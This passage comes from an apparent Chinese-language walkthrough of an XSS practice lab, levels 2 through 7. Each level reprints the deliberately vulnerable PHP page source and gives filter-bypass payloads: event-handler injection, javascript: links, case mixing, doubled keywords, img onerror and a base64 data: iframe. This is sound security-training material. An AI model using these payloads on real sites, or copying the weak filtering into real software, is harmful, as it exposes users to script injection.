实体。</p><p>预定义的字符是：</p><ul><li>&amp; （和号）成为 &amp;</li><li>“ （双引号）成为 “</li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 &lt;</li><li>（大于）成为 &gt;</li></ul><p><strong>提示：</strong>要把特殊的 HTML 实体转换回字符，使用htmlspecialchars_decode()函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs PHP">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level3.php?writing=wait&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level2&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;  //此处传入的值被htmlspecialchars进行了html实体转化</span><br><span class="hljs-string">&lt;form action=level2.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs PHP">尝试：<br>尝试输入<span class="hljs-number">123</span>，然后观察源码，发现相较于上一关，这边存在的是单引号的闭合，尝试Payload<br><span class="hljs-string">&#x27;&gt; &lt;script&gt;alert()&lt;/script&gt; &lt;&#x27;</span><br>未成功，观察源码可知，都被实体化了<br>针对这一情况可以采用onfocus事件来绕过<br><br>所以我们可以利用这个事件来绕过&lt;&gt;号的过滤已达到执行js的目的<br>Payload：<br><span class="hljs-string">&#x27; onfocus=alert() &#x27;</span>   不推荐<br><span class="hljs-string">&#x27; οnclick=alert() &#x27;</span>   推荐<br></code></pre></td></tr></table></figure><p>onfocus事件在元素获得焦点时触发，最常与 <input>、<select> 和 <a> 标签一起使用，以上面图片的html标签<input>为例，<input>标签是有输入框的，简单来说，onfocus事件就是当输入框被点击的时候，就会触发myFunction()函数，然后我们再配合javascript伪协议来执行javascript代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs PHP">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level4.php?keyword=try harder!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level3&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&quot;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level3.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&#x27;&gt;        </span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP">查看源码可知，这题和第三题基本一样，只不过这边是需要构造双引号进行闭合<br><br>Payload:<br><span class="hljs-string">&#x27; οnclick=alert() &#x27;</span>  <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs PHP">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level5.php?keyword=find a way out!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level4&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level4&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);   <span class="hljs-comment">//将输入的&gt;替换为空</span><br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);  <span class="hljs-comment">//将输入的&lt;替换为空</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level4.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str3</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs PHP">继续按上一关的Payload尝试<br><span class="hljs-string">&#x27; οnclick=alert() &#x27;</span>  <br><br>查看源码可以发现：on被替换成了o_n;&lt;script被替换成了&lt;scr_ipt<br>同时对输入的所有字母，都转化为小写<br>过滤了js的标签还有onfocus事件，虽然str_replace不区分大小写<br>但是有小写字母转化函数，所以就不能用大小写法来绕过过滤了，只能新找一个方法进行xss注入，<br>这里我们用a href标签法<br><br><span class="hljs-string">&quot;&gt; &lt;a href=javascript:alert()&gt;xss&lt;/a&gt; &lt;&quot;</span><br>输入后点击xss，触发a标签href属性即可<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs PHP">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level5&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);  <span class="hljs-comment">//把所有字符转换为小写</span><br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>); <span class="hljs-comment">//&lt;script被替换成了&lt;scr_ipt</span><br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);  <span class="hljs-comment">//on被替换成了o_n</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level5.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str3</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs PHP">尝试输入相关的关键词，看看这题过滤了哪些内容<br>onfocus &lt;script&gt; &lt;a href=javascript:<span class="hljs-title function_ invoke__">alert</span>()&gt;<br><br>发现on &lt;script&gt; href 都被过滤了<br>尝试看看能不能大小写绕过<br>OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:<span class="hljs-title function_ invoke__">alert</span>()&gt;<br>发现不存在大小写的过滤<br><br>Payload：<br><span class="hljs-string">&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt; &lt;&quot;</span><br><span class="hljs-string">&quot; OnClick=javascript:alert() &quot;</span><br><span class="hljs-string">&quot;&gt; &lt;a hRef=javascript:alert()&gt;xss&lt;/a&gt; &lt;&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs PHP">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level7.php?keyword=move up!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level6&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level6.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str6</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="Level7"><a href="#Level7" class="headerlink" title="Level7"></a>Level7</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs PHP">尝试输入相关的关键词，看看这题过滤了哪些内容<br>onfocus &lt;script&gt; &lt;a href=javascript:<span class="hljs-title function_ invoke__">alert</span>()&gt;<br><br>里面进行了小写转化，将检测出来的on，script，href给置换为空了<br>这里可以采用双写来进行绕过<br>比如on，我们可以写成oonn，当中间on被删掉的时候，就变成了on<br>比如script，可以写成scscriptipt，当script被删掉的时候，就变成了script<br><br>Payload：<br><span class="hljs-string">&quot;&gt; &lt;sCrsCriptipt&gt;alert()&lt;/sCrsCriptipt&gt; &lt;&quot;</span><br><span class="hljs-string">&quot; OOnnClick=alert() &quot;</span><br><span class="hljs-string">&quot;&gt; &lt;a hRhRefef=javascrscriptipt:alert()&gt;xss&lt;/a&gt; &lt;&quot;</span><br><br><span class="hljs-string">&quot;&gt; &lt;img srsrcc=&quot;</span>x<span class="hljs-string">&quot; oonnerror=alert(1)&gt; &lt;&quot;</span><br>onerror属性是指当图片加载不出来的时候触发js函数，以上面的代码为例，<br>这里因为src指向的是值x，而不是图片的地址和base64编码啥的，就会导致触发alert函数<br>当鼠标移出图片的时候执行的属性onmouseout<br>当鼠标移动到图片的时候执行的属性onmouseover<br><br>此外，这里还禁用了data，data禁用的原因是：<br>这里利用iframe标签，插入一个标签data:text/html;base64, <br>将后面的内容进行base64编码：PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+<br>进行base64解码后是&lt;script&gt;<span class="hljs-title function_ invoke__">alert</span>()&lt;/script&gt;<br>Payload：<br><span class="hljs-string">&quot;&gt; &lt;iframe srsrcc=&quot;</span>dadatata:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+<span class="hljs-string">&quot;&gt; &lt;&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs PHP">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level8.php?keyword=nice try!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level7&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level7&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> =<span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level7.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str6</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span 